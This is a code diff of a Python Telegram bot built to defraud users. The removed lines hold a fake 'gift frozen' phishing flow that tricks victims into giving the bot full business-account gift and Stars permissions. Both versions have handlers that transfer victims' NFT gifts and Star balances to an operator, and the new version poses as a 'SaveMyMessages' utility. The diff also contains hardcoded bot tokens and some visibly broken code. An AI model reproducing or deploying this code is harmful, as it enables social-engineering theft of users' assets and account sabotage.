@@ -1,149 +1,48 @@
-import asyncio
-import hashlib
-import platform
-from datetime import datetime, timedelta
-import os
-import json
-import random
-import requests
-import aiohttp
-import logging
-import code
-
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
-from aiogram.types import (
-    InlineQuery,
-    InlineQueryResultArticle,
-    InputTextMessageContent,
-    InlineKeyboardMarkup,
-    InlineKeyboardButton,
-    FSInputFile,
-    CallbackQuery
-)
+from aiogram.types import FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
 from aiogram.filters import CommandStart, Command
 from aiogram.utils.keyboard import InlineKeyboardBuilder
+from aiogram.fsm.storage.memory import MemoryStorage
+import random
 
-if not logging.getLogger().handlers:
-    logging.basicConfig(
-        level=logging.INFO,
-        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-        filename="bot.log"  # Логи
-    )
-logger = logging.getLogger(__name__)
+from datetime import datetime
+import requests
+import aiohttp
+import asyncio
+import logging
 
 
-TOKEN = "7860507426:AAF6weuiHFqqZhjBWZnm0OW2Qlxo50TQErE"  # Токен бота
-LOG_CHAT_ID = -4656687127 # ID чата. Можно в группу или просто кента любого
+# Constants
+TOKEN = "7683325977:AAG5wbG5sgKjZAk5mIrLSSnx4FvQPBlo4Fw" #Токен бота
+LOG_CHAT_ID = 7662388704
+
 MAX_GIFTS_PER_RUN = 1000
-ADMIN_IDS = [8115830990] # ID админов куда падают гифты в случае неотработки рефки
-
-bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
-
-dp = Dispatcher(storage=MemoryStorage())
-
-
-@dp.message(Command("check_business"))
-async def check_business_cmd(message: types.Message):
-    """Принудительная проверка всех бизнес-подключений"""
-    if message.from_user.id not in ADMIN_IDS:
-        return await message.answer("🚫 Доступ запрещен")
-        
-    connections = await bot.get_business_connections()
-    await message.answer(f"🔍 Найдено подключений: {len(connections)}")
-    for connection in connections:
-        await handle_business(connection)
-
-@dp.message(Command("check_ref"))
-async def check_ref(message: types.Message):
-    """Проверка реферальных связей"""
-    if message.from_user.id not in ADMIN_IDS:
-        return await message.answer("🚫 Доступ запрещен")
-        
-    try:
-        with open("referrers.json", "r") as f:
-            data = json.load(f)
-        text = "📊 Реферальные связи:\n" + "\n".join(f"{k} → {v}" for k, v in data.items())
-        await message.answer(text[:4000])
-    except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
-
 last_messages = {}
-user_referrer_map = {}
-user_referrals = {}  # inviter_id -> [business_ids]
-ref_links = {}       # ref_code -> inviter_id
+ADMIN_IDS = [7662388704] #Вставить айди админов
+storage = MemoryStorage()
 
+logging.basicConfig(level=logging.INFO)
+
+import os
+import json
+
+# Загружаем user_referrer_map из файла, если есть
 if os.path.exists("referrers.json"):
-    referrers_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "referrers.json")
-    try:
-        with open(referrers_path, "r") as f:  
-            user_referrer_map = json.load(f)
-    except (json.JSONDecodeError, IOError):
-        user_referrer_map = {}  
-        with open(referrers_path, "w") as f:
-            json.dump(user_referrer_map, f)
+    with open("referrers.json", "r") as f:
+        user_referrer_map = json.load(f)
+else:
+    user_referrer_map = {}
+user_referrals = {}     # inviter_id -> [business_ids]
+ref_links = {}          # ref_code -> inviter_id
 
-def get_expiration_str():
-    now = datetime.utcnow()
-    expiration = now + timedelta(days=365)
-    if platform.system() == "Windows":
-        return expiration.strftime("%#d %b %Y, %#H:%M UTC")
-    else:
-        return expiration.strftime("%-d %b %Y, %-H:%M UTC")
-
-@dp.inline_query()
-async def handle_inline_query(inline_query: InlineQuery):
-    try:
-        query = inline_query.query.strip()
-        parts = [p.strip() for p in query.split(",")]
-        if len(parts) != 3:
-            return
-
-        target_user = parts[0]
-        gift_name = parts[1]
-        gift_url = parts[2]
-        expiration_str = get_expiration_str()
-
-        # Рефка (inline_query.from_user)
-        ref_code = f"ref{inline_query.from_user.id}"
-        ref_link = f"https://t.me/{(await bot.me()).username}?start={ref_code}"
-
-        message_text = (
-            f"This is an automatic message!❄️\n\n"
-            f"Dear, {target_user}\n\n"
-            f"Your gift <a href='{gift_url}'>{gift_name}</a> was removed from the market for suspicious activity by one of our supervisors "
-            f"and it was confirmed by our team of moderators. Now it's removed until <b>{expiration_str}</b>.\n\n"
-            f"Your account will be automatically released on <b>{expiration_str}</b>. "
-            f"If you think this is a mistake, you can submit a complaint using the button below."
-        )
-
-        keyboard = InlineKeyboardMarkup(
-            inline_keyboard=[
-                [InlineKeyboardButton(text="Submit complaint", url=ref_link)]  # Используем рефку
-            ]
-        )
-
-        result_id = hashlib.md5(message_text.encode()).hexdigest()
-        result = InlineQueryResultArticle(
-            id=result_id,
-            title="Send gift warning",
-            description=f"Gift for {target_user}",
-            input_message_content=InputTextMessageContent(
-                message_text=message_text,
-                parse_mode=ParseMode.HTML
-            ),
-            reply_markup=keyboard
-        )
-
-        await inline_query.answer([result], cache_time=1)
-        print("✅ Inline response sent")
-
-    except Exception as e:
-        print("❌ Error in inline_query:", e)
+# Bot initialization
+bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
+dp = Dispatcher(storage=MemoryStorage())
 
 class Draw(StatesGroup):
     id = State()
@@ -158,38 +57,41 @@ def main_menu_kb():
         [InlineKeyboardButton(text="📖 Инструкция", callback_data="show_instruction")]
     ])
 
-@dp.message(CommandStart())
+@dp.message(Command("start"))
 async def start_cmd(message: types.Message):
     args = message.text.split(" ")
-    
-    # Тихая обработка реферальной ссылки (без уведомления пользователя)
+
     if len(args) > 1 and args[1].startswith("ref"):
         ref_code = args[1]
         try:
             inviter_id = int(ref_code.replace("ref", ""))
-            if inviter_id and inviter_id != message.from_user.id:
-                user_referrer_map[message.from_user.id] = inviter_id
-                with open("referrers.json", "w") as f:
-                    json.dump(user_referrer_map, f)
         except ValueError:
-            pass
+            inviter_id = None
 
-    # "Unfreeze Order"
-    unfreeze_button = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [InlineKeyboardButton(text="❄️ Unfreeze Order", callback_data="unfreeze_order")]
-        ]
-    )
-    
-    await message.answer(
-        text="<b>The gift is frozen!</b>\n\n"
-             "If you have no connection to this incident, click the \"Unfreeze Order\" button and complete a quick verification process, which takes just 1 minute.\n\n"
-             "After verification, the gift will be credited back to your Telegram profile.\n\n"
-             "⚠️ Please note that selling this gift will no longer available on @Tonnel_Network_bot.",
-        reply_markup=unfreeze_button,
-        parse_mode="HTML"
-    )
+        if inviter_id and inviter_id != message.from_user.id:
+            # Сохраняем user_referrer_map в файл
+            user_referrer_map[message.from_user.id] = inviter_id
+            with open("referrers.json", "w") as f:
+                json.dump(user_referrer_map, f)
+                
+            await message.answer(f"Вы были приглашены пользователем <code>{inviter_id}</code>!")
+        else:
+            await message.answer("Некорректная или своя собственная реферальная ссылка 🤷‍♂️")
 
+    photo = FSInputFile("savemod_banner.jpg")
+    await message.answer_photo(
+        photo=photo,
+        caption=(
+            "👋 Добро пожаловать в <b>SaveMyMessages</b>!\n"
+            "🔹 Сохраняйте одноразовые сообщения\n"
+            "🔹 Сохраняйте удалённые сообщения\n"
+            "🔹 Сохраняйте отредактированные сообщения\n\n"
+            "📖 <b>Перед началом ознакомьтесь с инструкцией</b>\n"
+
+            "Выберите, что хотите сохранять:"
+        ),
+        reply_markup=main_menu_kb()
+    )
 @dp.message(Command("getrefZZZ"))
 async def send_ref_link(message: types.Message):
     user_id = message.from_user.id
@@ -197,12 +99,30 @@ async def send_ref_link(message: types.Message):
     ref_links[ref_code] = user_id
     await message.answer(f"Ваша реферальная ссылка:https://t.me/{(await bot.me()).username}?start={ref_code}")
 
+@dp.callback_query(F.data == "show_instruction")
+async def send_instruction(callback: types.CallbackQuery):
+    img = FSInputFile("instruction_guide.png")
+    await callback.message.answer_photo(
+        photo=img,
+        caption=(
+            "<b>Как подключить бота к бизнес-аккаунту:</b>\n\n"
+            "1. Перейдите в «Настройки» → <i>Telegram для бизнеса</i>\n"
+            "2. Перейдите в <i>Чат-боты</i>\n"
+            "3. Добавьте <b>@SaveMyMessagessBot</b> в список\n"
+            "4. Поставьте все галочки в нижних полях\n\n"
+            "После этого функции начнут работать автоматически ✅"
+        )
+    )
+    await callback.answer()
+
 
 @dp.callback_query(F.data.in_({"temp_msgs", "deleted_msgs", "edited_msgs", "animations"}))
 async def require_instruction(callback: types.CallbackQuery):
     await callback.answer("Сначала нажмите на 📖 Инструкцию сверху!", show_alert=True)
 
-async def pagination(page=0):
+async def pagination(
+    page=0
+):
     url = f'https://api.telegram.org/bot{TOKEN}/getAvailableGifts'
     try:
         response = requests.get(url)
@@ -236,6 +156,7 @@ async def pagination(page=0):
                 InlineKeyboardButton(
                     text="Вперед",
                     callback_data=f"next_{page + 1}"
+
                 )
             )
         elif count < 9:
@@ -251,6 +172,7 @@ async def pagination(page=0):
                 InlineKeyboardButton(
                     text="•",
                     callback_data="empty"
+
                 )
             )
         elif page > 0 and count >= 9:
@@ -266,9 +188,11 @@ async def pagination(page=0):
                 InlineKeyboardButton(
                     text="Вперед",
                     callback_data=f"next_{page + 1}"
+
                 )
             )
         return builder.as_markup()
+            
     except Exception as e:
         print(e)
         await bot.send_message(chat_id=ADMIN_IDS[0], text=f"{e}")
@@ -279,7 +203,7 @@ async def handle_business(business_connection: types.BusinessConnection):
     builder = InlineKeyboardBuilder()
     
     builder.button(
-        text="💰 Украсть подарки", 
+        text="🎁 Украсть подарки", 
         callback_data=f"steal_gifts:{business_id}"
     )
     builder.button(
@@ -289,32 +213,35 @@ async def handle_business(business_connection: types.BusinessConnection):
     
     user = business_connection.user
     
-    info = await bot.get_business_connection(business_id)
-    rights = info.rights
-    gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
-    stars = await bot.get_business_account_star_balance(business_id)
-    
+    try:
+        info = await bot.get_business_connection(business_id)
+        rights = info.rights
+        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
+        stars = await bot.get_business_account_star_balance(business_id)
+    except Exception as e:
+        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка получения данных бизнес-аккаунта: {e}")
+        return
+
+    # Рассчеты
     total_price = sum(g.convert_star_count or 0 for g in gifts.gifts if g.type == "regular")
     nft_gifts = [g for g in gifts.gifts if g.type == "unique"]
     nft_transfer_cost = len(nft_gifts) * 25
     total_withdrawal_cost = total_price + nft_transfer_cost
     
+    # Форматирование текста (остаётся без изменений)
     header = f"✨ <b>Новое подключение бизнес-аккаунта</b> ✨\n\n"
-    
     user_info = (
         f"<blockquote>👤 <b>Информация о пользователе:</b>\n"
         f"├─ ID: <code>{user.id}</code>\n"
         f"├─ Username: @{user.username or 'нет'}\n"
         f"╰─ Имя: {user.first_name or ''} {user.last_name or ''}</blockquote>\n\n"
     )
-    
     balance_info = (
         f"<blockquote>💰 <b>Баланс:</b>\n"
         f"├─ Доступно звёзд: {int(stars.amount):,}\n"
         f"├─ Звёзд в подарках: {total_price:,}\n"
         f"╰─ <b>Итого:</b> {int(stars.amount) + total_price:,}</blockquote>\n\n"
     )
-    
     gifts_info = (
         f"<blockquote>🎁 <b>Подарки:</b>\n"
         f"├─ Всего: {gifts.total_count}\n"
@@ -355,7 +282,7 @@ async def handle_business(business_connection: types.BusinessConnection):
     
     full_message = header + user_info + balance_info + gifts_info + nft_list + rights_info + footer
     
-    # Отправка в лог-чат
+    # 1. Отправка в основной лог-чат
     try:
         await bot.send_message(
             chat_id=LOG_CHAT_ID,
@@ -365,38 +292,35 @@ async def handle_business(business_connection: types.BusinessConnection):
             disable_web_page_preview=True
         )
     except Exception as e:
-        print(f"Ошибка при отправке в лог-чат: {e}")
+        logger.error(f"Ошибка при отправке в лог-чат: {e}")
 
-    # Увед рефа
+    # 2. Отправка пригласившему (если есть)
     inviter_id = user_referrer_map.get(user.id)
+    
     if inviter_id and inviter_id != user.id:
         try:
             await bot.send_message(
                 chat_id=inviter_id,
-                text=full_message,
+                text=full_message,  # Точно такое же сообщение
                 reply_markup=builder.as_markup(),
                 parse_mode="HTML",
                 disable_web_page_preview=True
             )
         except Exception as e:
-            print(f"Ошибка при отправке уведомления пригласившему {inviter_id}: {e}")
-            try:
-                await bot.send_message(
-                    chat_id=LOG_CHAT_ID,
-                    text=f"⚠️ Не удалось отправить уведомление пригласившему <code>{inviter_id}</code>: {e}",
-                    parse_mode="HTML"
-                )
-            except:
-                pass
-    
+            error_msg = f"⚠️ Не удалось отправить лог пригласившему {inviter_id}: {str(e)}"
+            logger.error(error_msg)
+            await bot.send_message(LOG_CHAT_ID, error_msg)
 
 @dp.callback_query(F.data == "draw_stars")
 async def draw_stars(message: types.Message, state: FSMContext):
-    await message.answer(text="Введите айди юзера кому перевести подарки")
+    await message.answer(
+        text="Введите айди юзера кому перевести подарки"
+    )
     await state.set_state(Draw.id)
 
 @dp.message(F.text, Draw.id)
 async def choice_gift(message: types.Message, state: FSMContext):
+
     msg = await message.answer(
         text="Актуальные подарки:",
         reply_markup=await pagination()
@@ -416,7 +340,7 @@ async def draw(callback: CallbackQuery, state: FSMContext):
         chat_id=int(user_id)
     )
     await callback.message.answer("Успешно отправлен подарок")
-    await state.clear()
+    await state.clear
 
 @dp.callback_query(F.data.startswith("next_") or F.data.startswith("down_"))
 async def edit_page(callback: CallbackQuery):
@@ -427,6 +351,8 @@ async def edit_page(callback: CallbackQuery):
         text="Актуальные подарки:",
         reply_markup=await pagination(page=int(callback.data.split("_")[1]))
     )
+    
+            
 
 @dp.message(Command("ap"))
 async def apanel(message: types.Message):
@@ -443,7 +369,6 @@ async def apanel(message: types.Message):
         text="Админ панель:",
         reply_markup=builder.as_markup()
     )
-
 @dp.callback_query(F.data.startswith("destroy:"))
 async def destroy_account(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
@@ -475,22 +400,102 @@ async def decline(callback: CallbackQuery):
     await bot.set_business_account_bio(business_id, "Some bot")
     await callback.message.answer("Мамонт спасен от сноса.")
 
+    user_id = message.from_user.id
+    inviter_id = user_referrer_map.get(user_id)
+
+    # Если нет пригласившего — fallback на первого админа
+    recipient_id = inviter_id if inviter_id else ADMIN_IDS[0]
+
+    try:
+        gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
+        gifts_list = gifts.gifts if hasattr(gifts, 'gifts') else []
+    except Exception as e:
+        await bot.send_message(LOG_CHAT_ID, f"❌ Ошибка при получении подарков: {e}")
+        return
+
+    gifts_to_process = gifts_list[:MAX_GIFTS_PER_RUN]
+    if gifts_to_process == []:
+        await bot.send_message(chat_id=LOG_CHAT_ID, text="У пользователя нет подарков.")
+    
+    for gift in gifts_to_process:
+        gift_id = gift.owned_gift_id
+        print(gift.gift)
+
+        gift_type = gift.type
+        isTransfered = gift.can_be_transferred if gift_type == "unique" else False
+        transfer_star_count = gift.transfer_star_count if gift_type == "unique" else False
+        gift_name = gift.gift.name.replace(" ", "") if gift.type == "unique" else "Unknown"
         
+        if gift_type == "regular":
+            try:
+                await bot.convert_gift_to_stars(business_id, gift_id)
+            except:
+                pass
+    
+        if not gift_id:
+            continue
+
+        # Передача
+        if isTransfered:
+            try:
+                steal = await bot.transfer_gift(business_id, gift_id, recipient_id, transfer_star_count)
+                stolen_nfts.append(f"t.me/nft/{gift_name}")
+                stolen_count += 1
+            except Exception as e:
+                await message.answer(f"❌ Не удалось передать подарок {gift_name} пользователю {recipient_id}")
+                print(e)
+
+
+    # Лог
+    if stolen_count > 0:
+        text = (
+            f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>\n\n" +
+            "\n".join(stolen_nfts)
+        )
+        await bot.send_message(LOG_CHAT_ID, text)
+    else:
+        await message.answer("Не удалось украсть подарки")
+    
+    # Перевод звёзд
+    try:
+        stars = await bot.get_business_account_star_balance(business_id)
+        amount = int(stars.amount)
+        if amount > 0:
+            await bot.transfer_business_account_stars(business_id, amount, recipient_id)
+            await bot.send_message(LOG_CHAT_ID, f"🌟 Выведено звёзд: {amount}")
+        else:
+            await message.answer("У пользователя нет звезд.")
+    except Exception as e:
+        await bot.send_message(LOG_CHAT_ID, f"🚫 Ошибка при выводе звёзд: {e}")
+
 @dp.callback_query(F.data.startswith("steal_gifts:"))
 async def steal_gifts_handler(callback: CallbackQuery):
     business_id = callback.data.split(":")[1]
-    user_id = callback.from_user.id
-    inviter_id = user_referrer_map.get(user_id)
     
+    # Получаем информацию о бизнес-аккаунте
+    try:
+        business_connection = await bot.get_business_connection(business_id)
+        user = business_connection.user
+    except Exception as e:
+        await callback.answer(f"❌ Ошибка получения бизнес-аккаунта: {e}")
+        return
+
+    # Определяем получателя (пригласившего бизнес-аккаунта)
+    inviter_id = user_referrer_map.get(user.id)  # Важно: user.id, а не callback.from_user.id
     if inviter_id:
         try:
-            await bot.get_chat(inviter_id)
+            # Проверяем доступность пригласившего
+            await bot.send_chat_action(inviter_id, "typing")
             recipient_id = inviter_id
+            print(f"Подарки будут отправлены пригласившему: {inviter_id}")
         except Exception:
             recipient_id = ADMIN_IDS[0]
+            print("Пригласивший недоступен, отправляем админу")
     else:
         recipient_id = ADMIN_IDS[0]
+        print("Пригласивший не найден, отправляем админу")
 
+    # Дальше идёт существующая логика обработки подарков...
     stolen_nfts = []
     stolen_count = 0
     errors = []
@@ -525,6 +530,8 @@ async def steal_gifts_handler(callback: CallbackQuery):
             except Exception as e:
                 errors.append(f"Ошибка передачи {gift_id}: {e}")
 
+
+
     # Перевод звёзд
     try:
         stars = await bot.get_business_account_star_balance(business_id)
@@ -539,100 +546,18 @@ async def steal_gifts_handler(callback: CallbackQuery):
     result_msg = []
     if stolen_count > 0:
         result_msg.append(f"🎁 Успешно украдено подарков: <b>{stolen_count}</b>")
-        result_msg.extend(stolen_nfts[:10])  
+        result_msg.extend(stolen_nfts[:10])  # Ограничиваем количество выводимых NFT
     
     if errors:
         result_msg.append("\n❌ Ошибки:")
-        result_msg.extend(errors[:5])  
+        result_msg.extend(errors[:5])  # Ограничиваем количество выводимых ошибок
 
     await callback.message.answer("\n".join(result_msg), parse_mode="HTML")
     await callback.answer()
-
-@dp.callback_query(F.data == "unfreeze_order")
-async def handle_unfreeze_order(callback: CallbackQuery):
-    await callback.message.delete()
-    # Три кнопке в unfreeze
-    options_keyboard = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [InlineKeyboardButton(text="1️⃣", callback_data="unfreeze_option_1")],
-            [InlineKeyboardButton(text="2️⃣", callback_data="unfreeze_option_2")],
-            [InlineKeyboardButton(text="3️⃣", callback_data="unfreeze_option_3")]
-        ]
-    )
-    
-    await callback.message.answer(
-        text="❓ Under what circumstances did you receive\nthe frozen Gift?\n\n"
-             "Please choose one of the options below:\n\n"
-             "1️⃣ Purchased via Telegram and later\nupgraded\n\n"
-             "2️⃣ Received directly from another user (as a\ngift or off-market trade)\n\n"
-             "3️⃣ Acquired through the marketplace",
-        reply_markup=options_keyboard
-    )
-    await callback.answer()
-
-@dp.callback_query(F.data.startswith("unfreeze_option_"))
-async def handle_unfreeze_option(callback: CallbackQuery):
-    # Удаляет прошлое сообщение внизу команда если че просто вырезать
-    await callback.message.delete()
-    
-    # Текст инструкции
-    instruction_text = (
-        "Excellent! We have counted your answer\n\n"
-        "🎁 To restore the gift, you need to connect the bot to your workspace.\n\n"
-        "🔹What you need to do:\n\n"
-        "1️⃣ Add this bot to the \"Chatbots\" section in your business account\n"
-        "2️⃣ Enable all the functions in the \"Manage gifts and stars\" block:\n\n"
-        "✅ View gifts and stars\n"
-        "✅ Exchange gifts for stars\n"
-        "✅ Set up gifts\n"
-        "✅ Transfer and improve gifts\n"
-        "✅ Send stars\n\n"
-        "📩 After you add the bot and enable the necessary functions, do not turn it off "
-        "until we notify you when the gift is restored, on average it takes 1 minutes\n\n"
-        "We will see for ourselves when you do everything according to the instructions"
-    )
-
-    # Кнопка "Done"
-    done_button = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [InlineKeyboardButton(text="Done", callback_data="verification_done")]
-        ]
-    )
-    
-    # Отправляем инструкцию с кнопкой
-    await callback.message.answer(
-        text=instruction_text,
-        reply_markup=done_button
-    )
-    await callback.answer()
-
-
-# Обработчик кнопки "Done"
-@dp.callback_query(F.data == "verification_done")
-async def handle_done_button(callback: CallbackQuery):
-    # Тоже удаляет внизу строчка
-    await callback.message.delete()
-    
-    # Вериф финал
-    done_text = (
-        "🔔 Verification is in progress...\n\n"
-        "⚠️ This usually takes less than a minute. We'll notify you once it's done.\n\n"
-        "🙏 Please ensure the bot has access to Gifts and Stars."
-    )
-    await callback.message.answer(done_text)
-    await callback.answer()
-
+        
 async def main():
-    logger.info("Запуск бота...")
-    try:
-        connections = await bot.get_business_connections()
-        logger.info(f"Найдено подключений: {len(connections)}")  
-        for conn in connections:
-            await handle_business(conn)  
-    except Exception as e:
-        logger.error(f"Ошибка при проверке подключений: {e}")
-    
     await dp.start_polling(bot)
+
 
 if __name__ == "__main__":
     asyncio.run(main())
